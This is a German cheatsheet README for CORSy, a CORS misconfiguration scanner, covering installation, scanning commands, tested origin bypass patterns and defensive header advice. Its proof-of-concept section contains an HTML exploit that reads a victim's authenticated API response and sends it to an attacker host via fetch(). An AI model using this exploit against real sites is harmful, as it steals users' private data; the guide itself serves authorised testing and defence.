<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🌐 CORSy – Vollständiger Cheatsheet

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
   ██████╗ ██████╗ ██████╗ ███████╗██╗   ██╗
  ██╔════╝██╔═══██╗██╔══██╗██╔════╝╚██╗ ██╔╝
  ██║     ██║   ██║██████╔╝███████╗ ╚████╔╝ 
  ██║     ██║   ██║██╔══██╗╚════██║  ╚██╔╝  
  ╚██████╗╚██████╔╝██║  ██║███████║   ██║   
   ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝   ╚═╝   
      Cross-Origin Resource Sharing (CORS) Misconfiguration Scanner
```
<p align="center">
  <img src="https://img.shields.io/badge/CORSy-CORS_Scanner-blue?style=for-the-badge" alt="CORSy">
  <img src="https://img.shields.io/badge/Author-Somdev_Sangwan-orange?style=for-the-badge" alt="s0md3v">
  <img src="https://img.shields.io/badge/Category-Web_Security_&_API-green?style=for-the-badge" alt="Web Security">
  <img src="https://img.shields.io/badge/License-GPLv3-purple?style=for-the-badge" alt="GPLv3">
</p>

<p align="center">
  <b>🌐 Schnelles und umfassendes CLI-Tool zur Erkennung von CORS-Fehlkonfigurationen (Cross-Origin Resource Sharing) und zum Testen auf Cross-Origin-Datendiebstahlrisiken</b>
</p>

---

## 📋 Inhaltsverzeichnis

- [Übersicht und Grundlagen der CORS-Schwachstelle](#-overview--cors-vulnerability-basics)
  - [The Fatal Trio: Origin Reflection + Credentials True](#the-fatal-trio-origin-reflection--credentials-true)
- [Installation](#-Installation)
- [Grundlegendes Zielscannen](#-basic-target-scanning)
- [Getestete CORS-Angriffsvektoren](#-cors-attack-vectors-tested)
  - [Reflexion willkürlichen Ursprungs](#arbitrary-origin-reflection)
  - [Null Origin vertrauen (`Origin: null`)](#trusting-null-origin-origin-null)
  - [Präfix- und Suffix-Regex-Umgehung](#prefix--suffix-regex-bypass)
  - [Wildcard-Subdomain-Vertrauensstellung](#wildcard-subdomain-trust)
  - [Sonderzeichen-Bypass (`_`, `;`, `!`)](#special-character-bypass----)
- [Multi-Target-Scanning und Ausgabeexport](#-multi-target-scanning--output-export)
- [Proof-of-Concept (PoC) Exploits erstellen](#-crafting-proof-of-concept-poc-exploits)
- [Kurzreferenztabelle](#-quick-reference-table)
- [Verteidigungsüberlegungen und sichere Header](#-defensive-considerations--secure-headers)
- [Rechtlicher Haftungsausschluss](#-legal-disclaimer)

---

## 🎯 Übersicht und Grundlagen der CORS-Sicherheitslücke

**Cross-Origin Resource Sharing (CORS)** ist ein Browser-Sicherheitsmechanismus, der es Webservern ermöglicht, die **Same-Origin Policy (SOP)** zu lockern. Durch die Rückgabe von Headern wie:
- `Access-Control-Allow-Origin: <origin>`
- `Access-Control-Allow-Credentials: true`

Eine Webanwendung erteilt anderen Websites die Erlaubnis, ihre HTTP-Antworten im Namen des Opferbenutzers zu lesen.

### The Fatal Trio: Origin Reflection + Credentials True
Wenn eine Anwendung den eingehenden `Origin`-Header blind in `Access-Control-Allow-Origin` widerspiegelt und `Access-Control-Allow-Credentials: true` aktiviert, kann jede bösartige Website den Browser eines authentifizierten Besuchers zwingen, private Nachrichten, API-Schlüssel und Kontodetails zu lesen.

**CORSy** wurde von **Somdev Sangwan (s0md3v)** entwickelt und prüft systematisch Endpunkte mit mehr als 16 bekannten Ursprungspermutationen, um diese Fehlkonfigurationen zu erkennen.

---

## 📥 Installation
```bash
# Clone the repository
git clone https://github.com/s0md3v/Corsy.git
cd Corsy

# Install dependencies
pip install -r requirements.txt

# Run Corsy
python3 corsy.py -h
```
---

## 🚀 Grundlegendes Zielscannen

Scannen Sie einen einzelnen Webanwendungsendpunkt:
```bash
python3 corsy.py -u https://target.com/api/user/details
```
Fügen Sie benutzerdefinierte Header oder Sitzungscookies hinzu:
```bash
python3 corsy.py -u https://target.com/api/user/details \
  --headers "Cookie: session=abc123xyz"
```
---

## ⚡ CORS-Angriffsvektoren getestet

CORSy testet automatisch mehrere Ursprungspermutationsmuster:

### Willkürliche Ursprungsreflexion
Der Server spiegelt blind jede Domäne:
```http
Request:
Origin: https://evil.com

Response:
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```
### Vertrauen auf Null-Ursprung (`Origin: null`)
Anwendungen können `null`-Ursprüngen vertrauen (üblich bei lokalen Sandbox-Iframes oder `data:`-URLs):
```http
Request:
Origin: null

Response:
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```
*Kann durch Laden der Opfer-API aus einem Iframe mit `sandbox="allow-scripts allow-top-navigation"` ausgelöst werden.*

### Präfix- und Suffix-Regex-Umgehung
Schlechte Regex-Validierung (z. B. `.*target.com` oder `target.com.*`):
- `https://target.com.attacker.com`
- `https://not-target.com`

### Umgehung von Sonderzeichen (`_`, `;`, `!`)
Browser und Server gehen unterschiedlich mit URI-Trennzeichen um:
- `https://target.com_.attacker.com`
- `https://target.com%60.attacker.com`

---

## 🌐 Multi-Target-Scannen und Ausgabeexport

Scannen Sie große Listen von API-Endpunkten, die bei der Aufklärung entdeckt wurden:
```bash
# Scan a list of URLs with 10 concurrent threads
python3 corsy.py -i endpoints.txt -t 10

# Export results to clean JSON format
python3 corsy.py -i endpoints.txt -o cors_results.json
```
---

## 💻 Erstellung von Proof-of-Concept (PoC)-Exploits

Wenn CORSy eine Fehlkonfiguration mit zulässigen Anmeldeinformationen bestätigt, generieren Sie einen HTML-Exploit, um vertrauliche Daten zu stehlen:
```html
<!DOCTYPE html>
<html>
<body>
<h1>CORS Exploit Demo</h1>
<script>
    var req = new XMLHttpRequest();
    req.onload = function() {
        // Exfiltrate stolen private response to attacker server
        fetch("https://attacker.com/log?data=" + encodeURIComponent(this.responseText));
    };
    req.open("GET", "https://target.com/api/user/private_data", true);
    req.withCredentials = true; // Crucial for sending session cookies
    req.send();
</script>
</body>
</html>
```
---

## ⚡ Kurzreferenztabelle

| Ziel | Befehl |
|-----------|---------|
| **Einzelne URL scannen** | `python3 corsy.py -u <URL>` |
| **Mit Sitzungscookie scannen** | `python3 corsy.py -u <URL> --headers "Cookie: sess=123"` |
| **URL-Liste scannen** | `python3 corsy.py -i targets.txt` |
| **Multithread-Scan** | `python3 corsy.py -i targets.txt -t 20` |
| **Nach JSON exportieren** | `python3 corsy.py -i targets.txt -o results.json` |

---

## 🛡️ Defensive Überlegungen und sichere Kopfbälle

1. **Den Ursprung niemals willkürlich widerspiegeln:** Vergleichen Sie den `Origin`-Header mit einer expliziten, strengen serverseitigen Whitelist.
2. **Wildcard niemals mit Anmeldeinformationen koppeln:** Der Browser blockiert `Access-Control-Allow-Origin: *` mit `Credentials: true`, emuliert es jedoch niemals dynamisch.
3. **Vermeiden Sie es, `null` zu vertrauen:** Fügen Sie `null` nicht zu vertrauenswürdigen Ursprungsrichtlinien hinzu.

---

## ⚠️ Rechtlicher Haftungsausschluss

> [!ACHTUNG]
> CORSy ist ausschließlich für autorisierte Sicherheitsbewertungen, Penetrationstests und defensive Prüfungen gedacht. Das Testen von Websites ohne Genehmigung ist illegal.